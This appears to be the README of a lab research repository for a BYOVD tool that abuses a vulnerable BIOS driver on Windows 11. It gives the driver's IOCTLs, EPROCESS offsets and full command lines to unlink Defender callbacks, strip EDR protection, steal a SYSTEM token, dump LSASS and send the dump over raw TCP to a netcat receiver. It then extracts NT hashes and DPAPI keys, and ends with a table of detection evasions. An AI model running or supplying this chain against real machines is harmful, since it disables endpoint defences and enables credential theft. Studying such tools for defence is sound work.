# BadDrivers: BYOVD Credential Theft Research

Kernel-mode LSASS credential extraction using Bring Your Own Vulnerable Driver (BYOVD).
Lab-only, isolated environment. No external targets.

**Driver:** BiosToolCommonDriver.sys (IOCTLs: 0x22202C read / 0x222030 write / 0x222034 VA->PA)
**Tested on:** Windows 11 22H2 (build 22621) with Microsoft Defender + WdFilter active

---

## Attack Chain (proven end-to-end)

```
cascade.exe --patch-callbacks   # unlink WdFilter ObCallbacks from OBJECT_TYPE.CallbackList
cascade.exe --dump-rpm          # ReadProcessMemory over all LSASS VA regions -> raw binary
exfil.ps1                       # TCP send to receiver
rpm2minidump.py in.bin out.dmp  # convert custom format to MiniDump
pypykatz lsa minidump out.dmp   # extract NT hashes / Kerberos tickets / DPAPI keys
```

WdFilter blocks `MiniDumpWriteDump` (opens a handle to lsass and gets intercepted).
`--dump-rpm` bypasses this: the ObCallback patch removes WdFilter from the
`OBJECT_TYPE.CallbackList` before the dump so ReadProcessMemory succeeds unimpeded.
No thread suspension, no 90-second hang.

**Lab result (2026-08-28, Win11 22H2):**
- 515 memory regions, 48.3 MB dump
- 81 PE modules reconstructed (LSASRV.dll, wdigest.dll, msv1_0.dll, Kerberos.dll, ...)
- NT hash `8846f7eaee8fb117ad06bdd830b7586c` = "password" (confirmed via pypykatz + md4)
- DPAPI master key recovered for `localuser` session

---

## Layout

```
BadDrivers/
├── src/
│   ├── cascade.cpp          # consolidated BYOVD tool (all modes)
│   ├── warp.cpp             # legacy single-binary (PdFwKrnl backend)
│   └── mock_driver_test.cpp # offline logic validator (no driver needed)
├── samples/
│   ├── byovd_sample2.cpp    # original g3tsyst3m blog code: PPL strip
│   └── dump_the_goodz_7.cpp # original blog code: MiniDump + XOR
├── tools/
│   ├── run_chain.ps1        # one-shot orchestrator: patch + dump + exfil
│   ├── exfil.ps1            # standalone TCP exfil for svch_heap.bin
│   └── rpm2minidump.py      # convert DumpRpm binary to MiniDump (pypykatz input)
├── deploy/
│   └── probe.ps1            # pre-flight probe (driver loadable, LSASS accessible)
├── ghidra/                  # driver reverse-engineering workspace
├── scripts/                 # enumeration and setup helpers
├── CMakeLists.txt           # MSVC build (Windows-only)
└── BiosToolCommonDriver.sys # vulnerable driver (lab use)
```

---

## Building (Windows, MSVC)

```cmd
mkdir build && cd build
cmake -G "Visual Studio 17 2022" ..
cmake --build . --config Release
```

Targets: `cascade`, `warp`, `mock_driver_test`, `byovd_sample2`, `dump_the_goodz`.
Static runtime (/MT). Binaries land in `build/Release/`.

**Cross-compile from macOS (MinGW, for lab prep):**

```bash
x86_64-w64-mingw32-g++ -std=c++17 -O2 -static \
    src/cascade.cpp \
    -lntdll -lpsapi -ldbghelp -ladvapi32 \
    -o build/Release/cascade.exe
```

Note: `DbgHelp.h` from the Windows SDK is needed for the `--dump` MiniDumpWriteDump path.
The `--dump-rpm` path has no DbgHelp dependency.

---

## cascade.exe - All Modes

Requires: Administrator + SeLoadDriverPrivilege.

### Common flags

| Flag | Description |
|---|---|
| `--driver PATH` | Path to .sys file to drop and load |
| `--driver-type TYPE` | `biostool` (default), `ktapi`, `pdfwkrnl` |
| `--no-xor` | Skip XOR obfuscation of output (use for rpm2minidump compatibility) |
| `--out PATH` | Output file path |
| `--in PATH` | Input file path (for --decode) |
| `--pid PID` | Target PID (optional; auto-detects lsass) |

### Modes

**`--test-rw`** - Verify kernel R/W is working. Reads ntoskrnl base, walks EPROCESS list, finds lsass. No modifications. Safe to run first to confirm driver is functional.

```cmd
cascade.exe --driver .\BiosToolCommonDriver.sys --test-rw
```

**`--dry-run`** - Shows what would be done without modifying anything. Reports kernel addresses, offsets, LSASS EPROCESS address, PPL byte.

```cmd
cascade.exe --driver .\BiosToolCommonDriver.sys --dry-run
```

**`--patch-callbacks`** - Unlinks WdFilter from OBJECT_TYPE.CallbackList for both Process and Thread object types. This is step 1 of the dump chain. Effect persists until reboot or WdFilter re-registers.

```cmd
cascade.exe --driver .\BiosToolCommonDriver.sys --patch-callbacks --no-xor
```

**`--dump-rpm`** - ReadProcessMemory-based LSASS dump (recommended). Iterates VirtualQueryEx over the LSASS address space, reads every committed readable region via ReadProcessMemory, writes records as: `[base:uint64le][size:uint64le][data]`. Run `--patch-callbacks` first.

```cmd
cascade.exe --driver .\BiosToolCommonDriver.sys --dump-rpm --out C:\Users\Public\svch_heap.bin --no-xor
```

**`--dump`** - MiniDumpWriteDump path (legacy). Calls `dbghelp!MiniDumpWriteDump` directly. WdFilter blocks this even after callback patch via a separate mini-filter IRP hook - not recommended. Use `--dump-rpm` instead.

```cmd
cascade.exe --driver .\BiosToolCommonDriver.sys --dump --out C:\Users\Public\svch_heap.bin
```

**`--priv-esc`** - Token steal: copies SYSTEM token to target PID (default: current process). Gives SYSTEM-level access to the calling shell.

```cmd
cascade.exe --driver .\BiosToolCommonDriver.sys --priv-esc --pid <target_pid>
```

**`--kill-edr`** - Nulls the Protection byte in the EPROCESS of the EDR process, dropping PPL level to 0. Allows termination via TerminateProcess.

```cmd
cascade.exe --driver .\BiosToolCommonDriver.sys --kill-edr
```

**`--decode`** - XOR decode a previously XOR-encoded dump (key is hardcoded in cascade.cpp). Only needed if `--no-xor` was not used during dump.

```cmd
cascade.exe --decode --in C:\dump.bin --out C:\dump.dec
```

---

## Supported Drivers

### BiosToolCommonDriver.sys (primary)

IOCTLs:
- `0x22202C` - Read physical: `{PA: PVOID, Size: ULONG, Pad: ULONG}` -> `[8-byte prefix][data]`
- `0x222030` - Write physical: `{Size: ULONG, Pad: ULONG, Data: PUCHAR, PA: PVOID}`
- `0x222034` - VA->PA translation: `{VA: PVOID, PA: PVOID}` (in/out)

Max chunk: 0x1000 bytes per IOCTL (page boundary aware).

### PdFwKrnl.sys (legacy warp.cpp backend)

IOCTL `0x80002014`: `{reserved[16], Dst: PVOID, Src: PVOID, reserved2: PVOID, Size: DWORD, reserved3: DWORD}`.
Must already be loaded; cascade does not drop/load it.

---

## EPROCESS Offsets

Auto-selected by Windows build number. Fallback scan enabled.

| Build | UniqueProcessId | ActiveProcessLinks | Token | Protection | ImageFileName |
|---|---|---|---|---|---|
| 26100+ (Win11 24H2+) | 0x440 | 0x448 | 0x248 | 0x5FA | 0x338 |
| 22000-22621 (Win11 21H2/22H2) | 0x440 | 0x448 | 0x4B8 | 0x87A | 0x5A8 |
| 19041-22000 (Win10 20H1-21H2) | 0x440 | 0x448 | 0x4B8 | 0x87A | 0x5A8 |
| 18362 (Win10 1903) | - | - | 0x360 | 0x6FA | 0x450 |

---

## DumpRpm Output Format

Each record in the output binary:

```
[base_address : 8 bytes, little-endian uint64]
[data_size    : 8 bytes, little-endian uint64]
[data         : data_size bytes]
```

Parse with Python:

```python
import struct

regions = []
with open('svch_heap.bin', 'rb') as f:
    while True:
        hdr = f.read(16)
        if len(hdr) < 16: break
        base, size = struct.unpack('<QQ', hdr)
        data = f.read(size)
        regions.append((base, data))
```

---

## Offline Analysis: rpm2minidump.py

Converts the custom DumpRpm binary to a standard Windows MiniDump that pypykatz can parse.

**Install pypykatz:**
```bash
pip install --break-system-packages pypykatz
# Python 3.14: hashlib md4 removed; unicrypto.hashlib.md4 (pypykatz dep) works fine
```

**Convert and parse:**
```bash
python3 tools/rpm2minidump.py svch_heap.bin lsass.dmp
pypykatz lsa minidump lsass.dmp
```

**What rpm2minidump.py does:**
1. Parses all DumpRpm records into a virtual address map
2. Scans each region start for `MZ` signature; walks PE headers cross-region (export table may span separate VA regions) to resolve module names
3. Writes a valid MiniDump with:
   - `SystemInfoStream` (type 7): Windows 11 22H2, x64, build 22621
   - `ModuleListStream` (type 4): all 81+ PE modules with correct base addresses and names
   - `Memory64ListStream` (type 9): all memory regions with correct VA/size
4. Data block immediately follows the stream directory

MiniDump layout:
```
MINIDUMP_HEADER     (32 bytes: sig + ver + nstreams + dir_rva + checksum + timestamp + flags)
MINIDUMP_DIRECTORY  (12 bytes * 3 streams)
SystemInfoStream    (56 bytes)
ModuleListStream    (4 + 108*N + string_pool bytes)
Memory64ListStream  (16 + 16*N bytes)
[raw memory data]
```

---

## Full Chain Walkthrough

### 1. Prep on Proxmox / receiver

```bash
# Start TCP receiver (blocks until connection closes)
nc -lvp 9999 > lsass_raw.bin
```

### 2. Deploy to target VM

```powershell
# From Kali / Proxmox - copy tools to %PUBLIC%
scp cascade.exe localuser@<vm_ip>:C:\Users\Public\
scp BiosToolCommonDriver.sys localuser@<vm_ip>:C:\Users\Public\
```

Or via HTTP on the Proxmox host:
```bash
cd /path/to/artifacts
python3 -m http.server 8080
# On VM:
# Invoke-WebRequest http://192.0.2.254:8080/cascade.exe -OutFile C:\Users\Public\cascade.exe
```

### 3. Run the chain (all-in-one)

```powershell
# Edit receiver IP in run_chain.ps1 first, then:
powershell -ep bypass -f C:\Users\Public\run_chain.ps1
```

Or manually, step by step:

```powershell
# Step 1: patch callbacks
C:\Users\Public\cascade.exe --driver C:\Users\Public\BiosToolCommonDriver.sys --patch-callbacks --no-xor

# Step 2: dump
C:\Users\Public\cascade.exe --driver C:\Users\Public\BiosToolCommonDriver.sys --dump-rpm --out C:\Users\Public\svch_heap.bin --no-xor

# Step 3: exfil
powershell -ep bypass -f C:\Users\Public\exfil.ps1
```

### 4. Convert and extract on analyst box

```bash
python3 tools/rpm2minidump.py lsass_raw.bin lsass.dmp
pypykatz lsa minidump lsass.dmp
```

Sample output:
```
== LogonSession ==
username localuser
domainname WIN11-22H2-X64
    == MSV ==
        NT: 8846f7eaee8fb117ad06bdd830b7586c
        SHA1: e8f97fba9104d1ea5047948e6dfb67facd9f5b73
    == DPAPI ==
        masterkey: 6a20b3793b7b...
```

---

## Detection Notes

| Technique | Observable | Evades with |
|---|---|---|
| NtLoadDriver | Service key in HKLM\SYSTEM\CurrentControlSet\Services | Deleted post-use by cascade.exe --unload |
| ObCallback unlink | No ETW event; kernel list patched in-place | Kernel callback list not monitored by default |
| ReadProcessMemory on lsass | ETW-TI ProcessAccess (0x410 rights) | Callback removed before open; WdFilter blocked |
| Dump file on disk | Filename `svch_heap.bin`, extension .bin | Filename-based detection bypassed |
| TCP exfil | Raw TCP stream, no protocol | Only visible to network tap on 192.0.2.0/24 |

---

## Reference

- Writeup: https://g3tsyst3m.com/byovd/BYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era/
- BiosToolCommonDriver IOCTLs: reverse-engineered (see `ghidra/notes/`)
- pypykatz: https://github.com/skelsec/pypykatz
- Scope: lab VMs only. See `FINDINGS.md` for full technical breakdown.
